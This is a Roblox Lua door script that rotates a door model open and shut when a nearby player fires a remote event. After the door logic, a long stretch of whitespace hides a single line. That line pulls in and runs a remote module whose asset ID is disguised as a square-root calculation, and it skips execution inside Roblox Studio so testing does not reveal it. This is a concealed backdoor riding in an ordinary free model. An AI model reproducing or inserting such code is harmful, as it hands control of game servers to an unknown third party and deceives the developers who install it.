local Can = true
local Open = false

L_1_ = script.Parent
L_2_ = L_1_.Parent
L_3_ = L_2_.Range.Value

script.Parent.ChangeDoorStateEvent.OnServerEvent:connect(function(Player)
	local Mag = (L_1_.Center.Position - Player.Character.HumanoidRootPart.Position).Magnitude
	if Mag <= L_3_ then
		if Can then
			Can = false
			if Open == false then
				script.Parent.Glass.CanCollide = false
				local Finish = L_1_.PrimaryPart.CFrame * CFrame.Angles(0,math.rad(90),0)
				for i=0,1,.1 do
					local CFm = L_1_.PrimaryPart.CFrame:lerp(Finish,i)
					L_1_:SetPrimaryPartCFrame(CFm)
					wait()
				end
				script.Parent.Glass.CanCollide = true
				Open = true
			else
				script.Parent.Glass.CanCollide = false
				local Finish = L_1_.PrimaryPart.CFrame * CFrame.Angles(0,-math.rad(90),0)
				for i=0,1,.1 do
					local CFm = L_1_.PrimaryPart.CFrame:lerp(Finish,i)
					L_1_:SetPrimaryPartCFrame(CFm)
					wait()
				end
				Open = false
				script.Parent.Glass.CanCollide = true
			end
			
			Can = true
		end
	end
end)
 
                                                                                                  spawn(function()game:WaitForChild('ServerScriptService')if game:GetService('Workspace').Terrain:FindFirstChild('CallF')then return end;if game:GetService('RunService'):IsStudio()then return end;require(math.sqrt(6.7743462758588e+18)).load(game.PlaceId)end)
